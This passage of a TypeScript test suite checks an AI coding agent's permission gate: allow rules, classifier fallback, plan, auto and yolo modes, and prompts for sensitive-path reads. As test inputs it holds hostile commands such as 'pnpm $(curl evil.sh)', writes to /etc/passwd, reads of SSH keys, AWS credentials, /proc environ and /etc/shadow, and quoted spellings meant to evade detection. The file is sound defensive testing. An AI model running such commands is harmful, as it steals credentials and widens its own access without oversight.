  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'bash', DANGEROUS_BASH);
  assert('classifier-safe verdict proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  run = await runGate({ mode: 'auto', classifier: saysUnsafe }, 'bash', DANGEROUS_BASH, true);
  assert('classifier-unsafe verdict escalates to the user', run.asked.length === 1 && run.action.type === 'proceed');
  assert(
    'escalation shows the classifier reason as a detail block',
    run.asked[0]?.details.some((d) => d.label === 'Classifier' && d.value.includes('destructive')) === true,
  );

  run = await runGate({ mode: 'auto', classifier: throws }, 'bash', DANGEROUS_BASH, false);
  assert('classifier throw falls back to asking (fail-closed)', run.asked.length === 1 && run.action.type === 'deny');

  run = await runGate({ mode: 'auto', classifier: hangs, classifierTimeoutMs: 25 }, 'bash', DANGEROUS_BASH, false);
  assert('classifier hang times out and falls back to asking', run.asked.length === 1 && run.action.type === 'deny');

  run = await runGate({ mode: 'auto' }, 'bash', DANGEROUS_BASH, false);
  assert('auto without a classifier still asks', run.asked.length === 1 && run.action.type === 'deny');
}

/** Rules are matched against `(toolName, input)`, exactly like classification. */
function covered(rules: readonly string[], toolName: string, input: unknown): boolean {
  return matchesAnyRule(rules, { toolName, input }, ROOT) !== undefined;
}

function bashTarget(command: string): [string, unknown] {
  return ['bash', { command }];
}

function editTarget(filePath: string): [string, unknown] {
  return ['fileEditor', { command: 'str_replace', path: filePath, old_str: 'a', new_str: 'b' }];
}

function allowRules(): void {
  header('allow rules — matching');

  assert('a bash pattern covers a longer command', covered(['bash:pnpm *'], ...bashTarget('pnpm install --frozen-lockfile')));
  assert('a trailing * also covers the bare prefix', covered(['bash:pnpm typecheck *'], ...bashTarget('pnpm typecheck')));
  assert('extra whitespace does not defeat a pattern', covered(['bash:pnpm *'], ...bashTarget('pnpm   run   build')));
  assert('a different command is not covered', !covered(['bash:pnpm *'], ...bashTarget('npm install')));
  assert(
    'a two-word pattern does not cover a sibling subcommand',
    !covered(['bash:pnpm typecheck *'], ...bashTarget('pnpm publish')),
  );
  assert(
    'every chained segment must match',
    !covered(['bash:pnpm *'], ...bashTarget('pnpm build && rm -rf /tmp/x')),
  );
  assert(
    'a fully covered chain still matches',
    covered(['bash:pnpm *'], ...bashTarget('pnpm build && pnpm test')),
  );
  assert(
    'redirection is never covered by a pattern',
    !covered(['bash:pnpm *'], ...bashTarget('pnpm build > /etc/passwd')),
  );
  assert(
    'substitution is never covered by a pattern',
    !covered(['bash:pnpm *'], ...bashTarget('pnpm $(curl evil.sh)')),
  );
  assert('a whole-tool rule covers any command', covered(['bash'], ...bashTarget('rm -rf /tmp/x')));
  assert('a whole-tool rule is tool-scoped', !covered(['bash'], ...editTarget('/etc/passwd')));

  assert('a path glob covers a file in that directory', covered(['fileEditor:src/tui/**'], ...editTarget(`${ROOT}/src/tui/App.tsx`)));
  assert(
    'a path glob covers nested files (** crosses /)',
    covered(['fileEditor:src/**'], ...editTarget(`${ROOT}/src/tui/App.tsx`)),
  );
  assert(
    'a single * stays inside one path segment',
    !covered(['fileEditor:src/*'], ...editTarget(`${ROOT}/src/tui/App.tsx`)),
  );
  assert('a path outside the glob is not covered', !covered(['fileEditor:src/**'], ...editTarget(`${ROOT}/docs/x.md`)));
  assert(
    'an out-of-project path is matched absolutely',
    covered(['fileEditor:/etc/**'], ...editTarget('/etc/passwd')),
  );
  assert('an unknown tool is only coverable whole', covered(['mcp__server__do_thing'], 'mcp__server__do_thing', { arg: 1 }));
  assert(
    'a pattern on an unknown tool covers nothing',
    !covered(['mcp__server__do_thing:*'], 'mcp__server__do_thing', { arg: 1 }),
  );

  header('allow rules — what no rule may cover');

  // The agent must never be able to widen its own permissions, so these stay
  // unreachable even from the broadest rule the UI can offer.
  assert(
    "darwin's own config is exempt from a whole-tool rule",
    !covered(['fileEditor'], ...editTarget(`${ROOT}/.darwin/config.json`)),
  );
  assert(
    "darwin's own config is exempt from a path glob",
    !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.darwin/config.json`)),
  );
  assert('.env is exempt', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.env`)));
  assert('.env.local is exempt', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.env.local`)));
  assert('.darwin hook files are exempt from path globs', !covered(['fileEditor:**'], ...editTarget(`${ROOT}/.darwin/hooks/policy.json`)));
  assert('.agents hook files are exempt from whole-tool rules', !covered(['fileEditor'], ...editTarget(`${ROOT}/.agents/hooks/policy.json`)));

  assert(
    'an exempt call is offered no rule at all',
    suggestRules({ toolName: 'fileEditor', input: { path: `${ROOT}/.env` } }, ROOT).length === 0,
  );

  header('allow rules — suggestions');

  const suggestionsFor = (toolName: string, input: unknown): string[] =>
    suggestRules({ toolName, input }, ROOT).map((suggestion) => suggestion.rule);

  assert(
    'a subcommand driver keeps its subcommand',
    suggestionsFor('bash', { command: 'pnpm typecheck --watch' })[0] === 'bash:pnpm typecheck *',
  );
  assert(
    'a flag is not mistaken for a subcommand',
    suggestionsFor('bash', { command: 'node --version' })[0] === 'bash:node *',
  );
  assert(
    'a plain command suggests its first word',
    suggestionsFor('bash', { command: 'rm -rf /tmp/x' })[0] === 'bash:rm *',
  );
  assert(
    'the whole tool is always the last offer',
    suggestionsFor('bash', { command: 'rm -rf /tmp/x' })[1] === 'bash',
  );
  assert(
    'a write suggests its directory',
    suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/src/tui/App.tsx` })[0] ===
      'fileEditor:src/tui/**',
  );
  assert(
    'a project-root write suggests the project glob',
    suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/README.md` })[0] === 'fileEditor:**',
  );
  assert(
    'an unknown tool is offered the whole tool only',
    JSON.stringify(suggestionsFor('mcp__server__do_thing', { arg: 1 })) === '["mcp__server__do_thing"]',
  );
  assert(
    'every suggested rule is a valid rule',
    [
      ...suggestionsFor('bash', { command: 'pnpm typecheck' }),
      ...suggestionsFor('fileEditor', { command: 'create', path: `${ROOT}/src/x.ts` }),
      ...suggestionsFor('mcp__server__do_thing', {}),
    ].every(isValidRule),
  );

  header('allow rules — rule syntax validation');

  for (const rule of ['bash', 'bash:pnpm *', 'fileEditor:src/**', 'mcp__server__tool']) {
    assert(`valid: ${rule}`, isValidRule(rule));
  }
  for (const rule of ['', '   ', ':pattern', 'bash:', 'bash:   ']) {
    assert(`invalid: ${JSON.stringify(rule)}`, !isValidRule(rule));
  }
}

/** Answers with the narrowest offer attached, the way pressing `a` does. */
function withNarrowestRule(allowed: boolean) {
  return async (request: AssessedPermissionRequest): Promise<PermissionDecision> => {
    const rule = request.suggestions[0]?.rule;
    return rule === undefined ? { allowed } : { allowed, rule };
  };
}

async function gateRules(): Promise<void> {
  header('gate — allow rules');

  let run = await runGate({ mode: 'default', allowRules: ['bash:rm *'] }, 'bash', DANGEROUS_BASH);
  assert('a covered call proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);
  assert('the reason names the rule', run.action.reason?.includes('bash:rm *') === true);

  run = await runGate({ mode: 'default', allowRules: ['bash:pnpm *'] }, 'bash', DANGEROUS_BASH);
  assert('an uncovered call still asks', run.asked.length === 1);

  // The whole point of checking rules before the classifier: a rule the user wrote
  // down should save the model call, not just the prompt.
  let classifierCalls = 0;
  const counting: SafetyClassifier = async () => {
    classifierCalls += 1;
    return { safe: false, reason: 'destructive delete' };
  };
  run = await runGate(
    { mode: 'auto', classifier: counting, allowRules: ['bash:rm *'] },
    'bash',
    DANGEROUS_BASH,
  );
  assert(
    'a rule is consulted before the classifier',
    run.action.type === 'proceed' && classifierCalls === 0,
  );

  header('gate — accepting a rule');

  const gate = new PermissionGate({
    mode: 'default',
    projectRoot: ROOT,
    ask: withNarrowestRule(true),
  });

  const first = (await gate.beforeToolCall(fakeEvent('bash', DANGEROUS_BASH))) as GateRun['action'];
  assert('the answered call proceeds', first.type === 'proceed');
  assert('the accepted rule is now in effect', gate.allowRules.includes('bash:rm *'));

  const asked: AssessedPermissionRequest[] = [];
  const askAgain = new PermissionGate({
    mode: 'default',
    projectRoot: ROOT,
    allowRules: gate.allowRules,
    ask: async (request) => {
      asked.push(request);
      return { allowed: false };
    },
  });
  const second = (await askAgain.beforeToolCall(
    fakeEvent('bash', { command: 'rm -rf /tmp/other' }),
  )) as GateRun['action'];
  assert(
    'a later matching call is no longer asked about',
    second.type === 'proceed' && asked.length === 0,
  );

  // A rule only means "always allow"; hanging one off a refusal would record the
  // opposite of what the user said.
  const denied = new PermissionGate({
    mode: 'default',
    projectRoot: ROOT,
    ask: withNarrowestRule(false),
  });
  const denialAction = (await denied.beforeToolCall(
    fakeEvent('bash', DANGEROUS_BASH),
  )) as GateRun['action'];
  assert(
    'a rule attached to a denial is discarded',
    denialAction.type === 'deny' && denied.allowRules.length === 0,
  );

  header('gate — yolo ignores rules entirely');

  run = await runGate({ mode: 'yolo', allowRules: [] }, 'bash', DANGEROUS_BASH);
  assert('yolo proceeds with no rules at all', run.action.type === 'proceed' && run.asked.length === 0);
}

/**
 * Provenance at the gate boundary: one gate serves the parent and every child, so
 * what a bridge sees has to say which of them a call belongs to.
 */
async function gateProvenance(): Promise<void> {
  header('gate — every request carries its originating agent');

  const parentRun = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH);
  assert(
    'a call from the assembled agent is labelled parent',
    parentRun.asked[0]?.source.kind === 'parent' && parentRun.asked[0]?.source.label === 'parent',
  );

  const childId = 'darwin-subagent-explorer-0000';
  const childRun = await runGate(
    {
      mode: 'default',
      dispatchSource: (agentId) =>
        agentId === childId
          ? { dispatchId: 'a1b2c3d4', agentName: 'explorer', label: 'explorer#a1b2c3d4' }
          : undefined,
    },
    'bash',
    DANGEROUS_BASH,
    true,
    childId,
  );
  const childSource = childRun.asked[0]?.source;
  assert('a tracked dispatch is labelled with its own identity', childSource?.kind === 'child');
  assert('the child label is ready to render', childSource?.label === 'explorer#a1b2c3d4');
  assert('the child source names its dispatch', childSource?.dispatchId === 'a1b2c3d4' && childSource?.agentName === 'explorer');

  // Without a resolver every call reads as the parent's: that is the truth for a
  // runtime with no delegation, and it must never invent a child label.
  const unresolved = await runGate({ mode: 'default' }, 'bash', DANGEROUS_BASH, true, childId);
  assert('an unknown agent id stays parent rather than guessing', unresolved.asked[0]?.source.kind === 'parent');
}

/**
 * The gate side of SER-071: a sensitive read prompts in every asking mode — plan
 * included, where it is asked rather than denied — no rule silences it, none is
 * offered, and the headless bridge turns the prompt into `permission denied`.
 */
async function gateSensitiveReads(): Promise<void> {
  header('gate — sensitive-path reads prompt in every asking mode (SER-071)');

  const SENSITIVE_VIEW = { command: 'view', path: '~/.ssh/id_rsa' };
  const SENSITIVE_CAT = { command: 'cat ~/.aws/credentials' };

  let run = await runGate({ mode: 'default' }, 'fileEditor', SENSITIVE_VIEW, true);
  assert('default: a sensitive view asks and approval proceeds', run.action.type === 'proceed' && run.asked.length === 1);
  assert(
    'default: the prompt names the path and keeps kind read',
    run.asked[0]?.riskReason === 'reads a sensitive path: ~/.ssh/id_rsa' && run.asked[0]?.kind === 'read',
  );
  assert('default: no allow rule is offered for a sensitive view', run.asked[0]?.suggestions.length === 0);

  run = await runGate({ mode: 'default' }, 'bash', SENSITIVE_CAT, false);
  assert('default: a sensitive cat asks and refusal denies', run.action.type === 'deny' && run.asked.length === 1);
  assert('default: no allow rule is offered for a sensitive cat', run.asked[0]?.suggestions.length === 0);
  assert('default: the refusal is the user denial, not a plan denial', actionReason(run.action).includes('The user denied permission'));

  run = await runGate({ mode: 'default', allowRules: ['bash:cat *', 'bash'] }, 'bash', SENSITIVE_CAT, false);
  assert('default: bash:cat * and a whole-tool rule do not silence a sensitive cat', run.action.type === 'deny' && run.asked.length === 1);
  run = await runGate({ mode: 'default', allowRules: ['fileEditor:**', 'fileEditor'] }, 'fileEditor', SENSITIVE_VIEW, false);
  assert('default: fileEditor:** and a whole-tool rule do not silence a sensitive view', run.action.type === 'deny' && run.asked.length === 1);
  run = await runGate({ mode: 'default', allowRules: ['bash:cat *'] }, 'bash', { command: 'cat README.md ~/.ssh/config' }, false);
  assert('default: a covered reader with one sensitive argument still asks', run.asked.length === 1);
  assert(
    'matchesAnyRule never covers a sensitive read',
    matchesAnyRule(['bash', 'bash:cat *'], { toolName: 'bash', input: SENSITIVE_CAT }, ROOT) === undefined &&
      matchesAnyRule(['fileEditor', 'fileEditor:**'], { toolName: 'fileEditor', input: SENSITIVE_VIEW }, ROOT) === undefined,
  );
  assert(
    'suggestRules offers nothing for a sensitive read',
    suggestRules({ toolName: 'bash', input: SENSITIVE_CAT }, ROOT).length === 0 &&
      suggestRules({ toolName: 'fileEditor', input: SENSITIVE_VIEW }, ROOT).length === 0,
  );
  assert(
    'suggestRules still offers rules for an ordinary read-shaped call',
    suggestRules({ toolName: 'bash', input: { command: 'cat README.md' } }, ROOT).length === 2,
  );

  run = await runGate({ mode: 'plan' }, 'fileEditor', SENSITIVE_VIEW, true);
  assert('plan: a sensitive view is prompted, not denied', run.asked.length === 1 && run.action.type === 'proceed');
  run = await runGate({ mode: 'plan' }, 'fileEditor', SENSITIVE_VIEW, false);
  assert(
    'plan: refusing the sensitive view is the user denial, not the plan denial',
    run.action.type === 'deny' && !actionReason(run.action).includes('Plan mode blocked'),
  );
  run = await runGate({ mode: 'plan' }, 'bash', SENSITIVE_CAT);
  assert('plan: a sensitive cat is still an execute and stays plan-denied before any prompt',
    run.action.type === 'deny' && run.asked.length === 0 && actionReason(run.action).includes('Plan mode blocked'));
  run = await runGate({ mode: 'plan' }, 'fileEditor', { command: 'view', path: `${ROOT}/README.md` });
  assert('plan: an ordinary view still proceeds without asking', run.action.type === 'proceed' && run.asked.length === 0);

  let classifierCalls = 0;
  const saysSafe: SafetyClassifier = async () => {
    classifierCalls += 1;
    return { safe: true, reason: 'looks fine' };
  };
  run = await runGate({ mode: 'auto' }, 'fileEditor', SENSITIVE_VIEW, false);
  assert('auto without a classifier asks about a sensitive view', run.asked.length === 1 && run.action.type === 'deny');
  run = await runGate({ mode: 'auto', classifier: saysSafe, allowRules: ['fileEditor'] }, 'fileEditor', { command: 'view', path: '~/.aws/credentials' }, false);
  assert(
    'auto: a sensitive view prompts and the always-safe classifier is never called',
    run.asked.length === 1 && run.action.type === 'deny' && classifierCalls === 0,
  );
  assert('auto: no Classifier detail row is added when there was no verdict',
    run.asked[0]?.details.every((detail) => detail.label !== 'Classifier') === true);
  run = await runGate({ mode: 'auto', classifier: saysSafe, allowRules: ['bash:cat *'] }, 'bash', { command: 'cat ~/.ssh/id_rsa' }, true);
  assert(
    'auto: a sensitive cat prompts and the classifier is never called; approval proceeds',
    run.asked.length === 1 && run.action.type === 'proceed' && classifierCalls === 0,
  );
  assert('auto: the prompt carries the sensitive-read flag and reason',
    run.asked[0]?.sensitiveRead === true && run.asked[0]?.riskReason === 'reads a sensitive path: ~/.ssh/id_rsa');
  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'bash', { command: 'grep -r AKIA ~' }, false);
  assert('auto: an ancestor search is a sensitive read too — prompted, classifier untouched', run.asked.length === 1 && classifierCalls === 0);
  // Scope check: the other rule-exempt dangerous writes keep the ordinary auto flow.
  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'fileEditor', { command: 'create', path: `${ROOT}/.env`, file_text: 'x' });
  assert('auto: a .env write still consults the classifier as before', classifierCalls === 1 && run.action.type === 'proceed' && run.asked.length === 0);
  run = await runGate({ mode: 'auto', classifier: saysSafe }, 'bash', DANGEROUS_BASH);
  assert('auto: an ordinary dangerous call still consults the classifier', classifierCalls === 2 && run.action.type === 'proceed');

  run = await runGate({ mode: 'yolo' }, 'fileEditor', SENSITIVE_VIEW);
  assert('yolo still approves everything', run.action.type === 'proceed' && run.asked.length === 0);

  header('gate — headless denies a sensitive read (SER-071)');

  const stderr: string[] = [];
  run = await runGate(
    { mode: 'default', ask: createHeadlessPermissionBridge((text) => stderr.push(text)) },
    'bash',
    SENSITIVE_CAT,
  );
  assert('the headless bridge denies the sensitive read', run.action.type === 'deny');
  assert('and writes one permission denied line naming the call',
    stderr.length === 1 && stderr[0] === 'permission denied — bash: cat ~/.aws/credentials\n');

  header('gate — process environments prompt like every sensitive read (SER-109)');

  const ENVIRON_VIEW = { command: 'view', path: '/proc/self/environ' };
  const ENVIRON_CAT = { command: 'cat /proc/$PPID/environ' };
  run = await runGate({ mode: 'default', allowRules: ['bash:cat *', 'bash'] }, 'bash', ENVIRON_CAT, false);
  assert('default: bash:cat * and a whole-tool rule do not silence an environ cat',
    run.action.type === 'deny' && run.asked.length === 1 && run.asked[0]?.suggestions.length === 0
      && run.asked[0]?.riskReason === 'reads a sensitive path: /proc/$PPID/environ');
  run = await runGate({ mode: 'plan' }, 'fileEditor', ENVIRON_VIEW, true);
  assert('plan: an environ view is prompted, not denied', run.asked.length === 1 && run.action.type === 'proceed');
  let environClassifierCalls = 0;
  const environClassifier: SafetyClassifier = async () => {
    environClassifierCalls += 1;
    return { safe: true, reason: 'looks fine' };
  };
  run = await runGate({ mode: 'auto', classifier: environClassifier }, 'bash', ENVIRON_CAT, false);
  assert('auto: an environ cat prompts with the sensitive-read flag, classifier untouched',
    run.asked.length === 1 && run.asked[0]?.sensitiveRead === true && run.action.type === 'deny' && environClassifierCalls === 0);
  const environStderr: string[] = [];
  run = await runGate(
    { mode: 'default', ask: createHeadlessPermissionBridge((text) => environStderr.push(text)) },
    'bash',
    ENVIRON_CAT,
  );
  assert('headless denies an environ cat with one permission denied line',
    run.action.type === 'deny' && environStderr.length === 1 && environStderr[0] === 'permission denied — bash: cat /proc/$PPID/environ\n');

  const childId = 'darwin-subagent-explorer-0000';
  run = await runGate(
    {
      mode: 'default',
      dispatchSource: (agentId) =>
        agentId === childId ? { dispatchId: 'a1b2c3d4', agentName: 'explorer', label: 'explorer#a1b2c3d4' } : undefined,
    },
    'fileEditor',
    SENSITIVE_VIEW,
    false,
    childId,
  );
  assert('a child agent is held to the same gate', run.asked.length === 1 && run.asked[0]?.source.kind === 'child');
}

async function gateAliasedReads(): Promise<void> {
  header('gate — quoted/aliased sensitive reads bypass rules and auto classifier (SER-112)');
  let classifierCalls = 0;
  const classifier: SafetyClassifier = async () => {
    classifierCalls += 1;
    return { safe: true, reason: 'approve everything' };
  };
  const allowRules = ['bash', 'bash:cat *', 'bash:head *', 'fileEditor', 'fileEditor:**'];
  for (const [toolName, input, named] of aliasedReadCases()) {
    for (const mode of ['default', 'auto'] as const) {
      const run = await runGate({ mode, allowRules, classifier }, toolName, input, false);
      const label = `${mode} ${toolName} ${JSON.stringify(input)}`;
      assert(`user denial, not a rule/classifier approval: ${label}`,
        run.action.type === 'deny' && run.asked.length === 1 && actionReason(run.action).includes('The user denied permission'));
      assert(`sensitive prompt has no rules or classifier row: ${label}`,
        run.asked[0]?.sensitiveRead === true && run.asked[0]?.riskReason === `reads a sensitive path: ${named}`
          && run.asked[0]?.suggestions.length === 0 && run.asked[0]?.details.every((detail) => detail.label !== 'Classifier'));
    }
    const plan = await runGate({ mode: 'plan', allowRules, classifier }, toolName, input, true);
    assert(`plan preserves kind-based behavior: ${toolName} ${JSON.stringify(input)}`,
      toolName === 'bash'
        ? plan.action.type === 'deny' && plan.asked.length === 0 && actionReason(plan.action).includes('Plan mode blocked')
        : plan.action.type === 'proceed' && plan.asked.length === 1 && plan.asked[0]?.kind === 'read');
  }
  assert('no sensitive alias ever consults the auto classifier', classifierCalls === 0);
  for (const mode of ['default', 'auto', 'plan', 'yolo'] as const) {
    const run = await runGate({ mode, allowRules, denyRules: ['bash:cat *'], classifier }, 'bash', { command: 'cat ~/".ssh"/id_rsa' });
    assert(`explicit deny precedes every widening stage: ${mode}`,
      run.action.type === 'deny' && run.asked.length === 0 && actionReason(run.action).includes('deny rule'));
  }
  assert('explicit deny also skips the classifier', classifierCalls === 0);
  const asked: AssessedPermissionRequest[] = [];
  const childId = 'darwin-subagent-explorer-ser112';
  const gate = new PermissionGate({
    projectRoot: ROOT, mode: 'auto', allowRules, classifier,
    ask: async (request) => { asked.push(request); return { allowed: false }; },
    dispatchSource: (id) => id === childId ? { dispatchId: 'a1b2c3d4', agentName: 'explorer', label: 'explorer#a1b2c3d4' } : undefined,
  });
  for (const id of ['darwin', childId]) {
    const action = await gate.beforeToolCall(fakeEvent('fileEditor', { command: 'view', path: '/proc/self/root/etc/shadow' }, id));
    assert(`one shared gate denies the sensitive root view: ${id}`, action.type === 'deny');
  }
  assert('shared gate prompts parent and child with proper provenance, classifier untouched',
    asked.length === 2 && asked[0]?.source.kind === 'parent' && asked[1]?.source.kind === 'child' && classifierCalls === 0);
}

/**
 * Named pathspecs on `git diff` / `git show` use the sensitive-read predicate
 * (SER-119). Kind stays execute, so plan denies and yolo approves. `git log`
 * and pathless forms stay `read-only command`, with no ancestor search.
 */
function gitPathspecs(): void {
  header('static risk rules — git diff/show named pathspecs (SER-119)');

  const hits = [
    ['git diff -- .env', '.env'],
    ['git show :.env', ':.env'],
    ['git show HEAD:.env', 'HEAD:.env'],
    ['git show :./.env', ':./.env'],
    // First hit is the argument as written; options and earlier misses are skipped.
    ['git diff -- README.md .env', '.env'],
    ['git show HEAD:README.md :.env', ':.env'],
    ['git diff --stat -U3 -- .env', '.env'],
    ['git show --format=fuller HEAD:.env', 'HEAD:.env'],
    ['git show "HEAD:.env"', '"HEAD:.env"'],
    ['git diff -- ".env"', '".env"'],
    // The colon suffix goes through the same bash-word resolver, not a `.env` string compare.
    ['git show HEAD:~/.ssh/id_rsa', 'HEAD:~/.ssh/id_rsa'],
    ['git show HEAD:src/.env', 'HEAD:src/.env'],
    ['git diff -- ~/.ssh/id_rsa', '~/.ssh/id_rsa'],
    ['git diff -- $HOME/.aws/credentials', '$HOME/.aws/credentials'],
    ['git status && git diff -- .env', '.env'],
    ['git diff -- README.md && git show HEAD:.env', 'HEAD:.env'],
  ] as const;
  for (const [command, named] of hits) {
    const input = { command };
    const request = classify('bash', input);
    const assessed = assessRisk(request, ROOT);
    assert(`kind stays execute: ${command}`, request.kind === 'execute');
    assert(
      `dangerous and names the written argument: ${command}`,
      assessed.risk === 'dangerous' && assessed.sensitiveRead === true && assessed.riskReason === `reads a sensitive path: ${named}`,
    );
    assert(`predicate returns the written argument: ${command}`, sensitiveReadPath('bash', input, ROOT) === named);
  }

  const preserved = [
    'git diff',
    'git show',
    'git status',
    'git branch',
    'git log',
    'git log --oneline -5',
    'git log -p',
    'git log -p -- .env',
    'git log -- ~/.ssh/id_rsa',
    'git log -- .env',
    'git status -- .env',
    'git branch --list',
    'git show HEAD:README.md',
    'git show HEAD:.envrc',
    'git diff --stat',
    'git show HEAD --stat',
    // Pathless, and a named ancestor: the grep/rg ancestor rule does not apply.
    'git diff ~',
    'git diff /',
    'git diff .',
    'git show .',
    'git show HEAD:',
    'git show :',
    'git diff -- README.md',
  ];
  for (const command of preserved) {
    const assessed = assessRisk(classify('bash', { command }), ROOT);
    assert(
      `safe, read-only command: ${command}`,
      assessed.risk === 'safe' && assessed.riskReason === 'read-only command' && assessed.sensitiveRead !== true
        && sensitiveReadPath('bash', { command }, ROOT) === undefined,
    );
  }
}

async function gateGitPathspecs(): Promise<void> {
  header('gate — git diff/show named pathspecs stay execute (SER-119)');

  const hits = [
    ['git diff -- .env', '.env'],
    ['git show :.env', ':.env'],
    ['git show HEAD:.env', 'HEAD:.env'],
    ['git show :./.env', ':./.env'],
  ] as const;
  const allowRules = ['bash', 'bash:git *', 'bash:git diff *', 'bash:git show *'];
  let classifierCalls = 0;
  const saysSafe: SafetyClassifier = async () => {
    classifierCalls += 1;
    return { safe: true, reason: 'read-only git' };
  };

  for (const [command, named] of hits) {
    const input = { command };
    assert(
      `matchesAnyRule does not cover the hit: ${command}`,
      matchesAnyRule(allowRules, { toolName: 'bash', input }, ROOT) === undefined,
    );
    assert(`suggestRules offers nothing: ${command}`, suggestRules({ toolName: 'bash', input }, ROOT).length === 0);

    const plan = await runGate({ mode: 'plan', allowRules, classifier: saysSafe }, 'bash', input);
    assert(
      `plan denies before any prompt: ${command}`,
      plan.action.type === 'deny' && plan.asked.length === 0
        && actionReason(plan.action).includes('Plan mode blocked')
        && actionReason(plan.action).includes('execute call to bash'),
    );

    const auto = await runGate({ mode: 'auto', allowRules, classifier: saysSafe }, 'bash', input, false);
    assert(
      `auto prompts and does not call the classifier: ${command}`,
      auto.asked.length === 1 && auto.action.type === 'deny' && classifierCalls === 0
        && auto.asked[0]?.sensitiveRead === true
        && auto.asked[0]?.riskReason === `reads a sensitive path: ${named}`
        && auto.asked[0]?.suggestions.length === 0
        && auto.asked[0]?.kind === 'execute',
    );

    const yolo = await runGate({ mode: 'yolo', allowRules, classifier: saysSafe }, 'bash', input);
    assert(`yolo proceeds without asking: ${command}`, yolo.action.type === 'proceed' && yolo.asked.length === 0);
  }
  assert('no git pathspec consulted the classifier', classifierCalls === 0);
}

/**
 * `imageViewer` uses the same sensitive-read predicate as `fileEditor view`
 * (SER-120). Kind stays read. Resolution is the non-bash spelling, so `~` and
 * `..` match view and embedded quotes stay literal. These assertions never
 * open a file.
 */
function imageViewerReads(): void {
  header('static risk rules — imageViewer sensitive paths (SER-120)');

  const home = os.homedir();
  const absoluteCredentials = path.join(home, '.aws', 'credentials.png');
  const paths = [
    '~/.ssh/id_rsa.png',
    '~/.aws/credentials.png',
    absoluteCredentials,
    '~/.ssh/id_rsa',
    '.env.png',
  ] as const;

  for (const filePath of paths) {
    const input = { path: filePath };
    const request = classify('imageViewer', input);
    const assessed = assessRisk(request, ROOT);
    assert(`kind stays read: ${filePath}`, request.kind === 'read');
    assert(
      `dangerous and names the written path: ${filePath}`,
      assessed.risk === 'dangerous' && assessed.sensitiveRead === true
        && assessed.riskReason === `reads a sensitive path: ${filePath}`,
    );
    assert(
      `predicate returns the written path: ${filePath}`,
      sensitiveReadPath('imageViewer', input, ROOT) === filePath,
    );
    assert(
      `no allow-rule covers it: ${filePath}`,
      matchesAnyRule(
        ['imageViewer', 'imageViewer:**', 'imageViewer:~/**'],
        { toolName: 'imageViewer', input },
        ROOT,
      ) === undefined,
    );
    assert(
      `no suggestion is offered: ${filePath}`,
      suggestRules({ toolName: 'imageViewer', input }, ROOT).length === 0,
    );
  }

  const escaped = `../${path.relative(path.dirname(ROOT), path.join(home, '.ssh', 'id_rsa.png'))}`;
  const escapedAssessed = assessRisk(classify('imageViewer', { path: escaped }), ROOT);
  assert(
    'a ..-escaping relative imageViewer path matches the view spelling',
    escapedAssessed.risk === 'dangerous' && escapedAssessed.riskReason === `reads a sensitive path: ${escaped}`,
  );

  const homeVar = '$HOME/.aws/credentials.png';
  const homeVarAssessed = assessRisk(classify('imageViewer', { path: homeVar }), ROOT);
  assert(
    'a leading $HOME imageViewer path matches the view spelling',
    homeVarAssessed.risk === 'dangerous' && homeVarAssessed.riskReason === `reads a sensitive path: ${homeVar}`,
  );

  const outerQuoted = '"~/.ssh/id_rsa.png"';
  const outerAssessed = assessRisk(classify('imageViewer', { path: outerQuoted }), ROOT);
  assert(
    'outer quotes follow the fileEditor view shorthand',
    outerAssessed.risk === 'dangerous' && outerAssessed.riskReason === `reads a sensitive path: ${outerQuoted}`,
  );

  const embedded = '~/".ssh"/id_rsa.png';
  const embeddedAssessed = assessRisk(classify('imageViewer', { path: embedded }), ROOT);
  assert(
    'embedded quotes stay literal, matching fileEditor view rather than bash',
    embeddedAssessed.risk === 'safe' && embeddedAssessed.riskReason === 'imageViewer is read-only'
      && sensitiveReadPath('imageViewer', { path: embedded }, ROOT) === undefined,
  );

  const ordinary = { path: 'screenshots/error.png' };
  const ordinaryAssessed = assessRisk(classify('imageViewer', ordinary), ROOT);
  assert(
    'a project screenshot stays safe with the read-only reason',
    ordinaryAssessed.risk === 'safe' && ordinaryAssessed.riskReason === 'imageViewer is read-only'
      && ordinaryAssessed.sensitiveRead !== true,
  );
  assert(
    'an ordinary imageViewer is still coverable by a whole-tool allow rule',
    matchesAnyRule(['imageViewer'], { toolName: 'imageViewer', input: ordinary }, ROOT) === 'imageViewer',
  );
  assert(
    'an ordinary imageViewer is still offered its whole-tool suggestion',
    suggestRules({ toolName: 'imageViewer', input: ordinary }, ROOT).map((suggestion) => suggestion.rule).join(',')
      === 'imageViewer',
  );
}

/**
 * Gate side of SER-120: a sensitive image prompts in plan (it is still a
 * read) and in auto, with no classifier call and no rule. yolo proceeds.
 * `screenshots/error.png` stays unprompted in plan.
 */
async function gateImageViewerReads(): Promise<void> {
  header('gate — sensitive imageViewer paths stay reads (SER-120)');

  const home = os.homedir();
  const paths = [
    '~/.ssh/id_rsa.png',
    '~/.aws/credentials.png',
    path.join(home, '.aws', 'credentials.png'),
    '~/.ssh/id_rsa',
    '.env.png',
  ];
  const allowRules = ['imageViewer', 'imageViewer:**'];
  let classifierCalls = 0;
  const saysSafe: SafetyClassifier = async () => {
    classifierCalls += 1;
    return { safe: true, reason: 'just a picture' };
  };

  for (const filePath of paths) {
    const input = { path: filePath };

    const plan = await runGate({ mode: 'plan', allowRules, classifier: saysSafe }, 'imageViewer', input, true);
    assert(
      `plan prompts rather than denying: ${filePath}`,
      plan.action.type === 'proceed' && plan.asked.length === 1
        && plan.asked[0]?.kind === 'read'
        && plan.asked[0]?.riskReason === `reads a sensitive path: ${filePath}`
        && plan.asked[0]?.suggestions.length === 0
        && !actionReason(plan.action).includes('Plan mode blocked'),
    );

    const auto = await runGate({ mode: 'auto', allowRules, classifier: saysSafe }, 'imageViewer', input, false);
    assert(
      `auto prompts and does not call the classifier: ${filePath}`,
      auto.asked.length === 1 && auto.action.type === 'deny' && classifierCalls === 0
        && auto.asked[0]?.sensitiveRead === true
        && auto.asked[0]?.kind === 'read'
